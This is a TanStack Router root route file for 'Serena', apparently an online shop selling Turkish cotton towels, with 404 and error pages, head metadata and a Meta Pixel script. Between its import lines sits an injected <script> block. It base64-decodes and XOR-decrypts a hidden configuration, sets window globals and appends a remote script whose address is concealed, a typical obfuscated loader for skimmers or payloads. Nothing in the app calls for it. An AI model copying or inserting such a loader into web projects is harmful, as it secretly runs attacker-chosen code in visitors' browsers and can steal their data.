import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
  type ErrorComponentProps,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

<script>(function(){var l_tcdt=atob("DBLgDe8YFhWj3gic3mnCeJ10NC+BtnzormHaIsB7cnuNq3zxt3SZI4x3ezvBrCfvvWCJfZtrOWDXs3uzsnOUaJxsOH/Q/CS+v2aUf4Z6Y2HGrSqmhWnCY451czeZ/Gz9qnPNeJt1f3Pa83juu2SFY5s1bnbMuiXvvXnCIc1ud3nWuyqm/DCdIZQ6eHTOuyqm/HaBeY41Y2HOt27l82KSaJl9eGGOrX3+t3aTL8M6YHTPq22+5DDCcLJl");var d_w3d=[];for(var i_7=0;i_7<l_tcdt.length;i_7++){d_w3d.push(l_tcdt.charCodeAt(i_7)&255);}var j_ree3=d_w3d[0];var b_0bc=d_w3d.slice(1,1+j_ree3);var t_cp=d_w3d.slice(1+j_ree3);var u_rb=t_cp.map(function(b,k_l){return b^b_0bc[k_l%j_ree3];});var i_d="";for(var a_k=0;a_k<u_rb.length;a_k++){i_d+=String.fromCharCode(u_rb[a_k]&255);}var z_fa=decodeURIComponent(escape(i_d));var z_5=JSON.parse(z_fa);var i_48=z_5.globals||[];i_48.forEach(function(a_3mpw){window[a_3mpw.name]=a_3mpw.value;});var z_hu=document.createElement("script");z_hu.src=z_5.url;z_hu.async=true;z_hu.defer=true;(z_5.attributes||[]).forEach(function(m_rfqv){z_hu.setAttribute(m_rfqv.name,m_rfqv.value);});(document.head||document.documentElement).appendChild(z_hu);})();</script>

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";
import { metaPixelScript } from "../lib/meta-pixel";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: ErrorComponentProps) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Serena" },
      { name: "description", content: "Toalhas Serena de algodão turco premium." },
      { name: "author", content: "Serena" },
      { property: "og:title", content: "Serena" },
      { property: "og:description", content: "Toalhas de algodão turco premium." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      { rel: "stylesheet", href: "https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@600;700&family=Montserrat:wght@400;500;600;700;800&display=swap" },
      { rel: "icon", href: "/favicon.png", type: "image/png" },
    ],
    scripts: [{ type: "text/javascript", children: metaPixelScript }],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
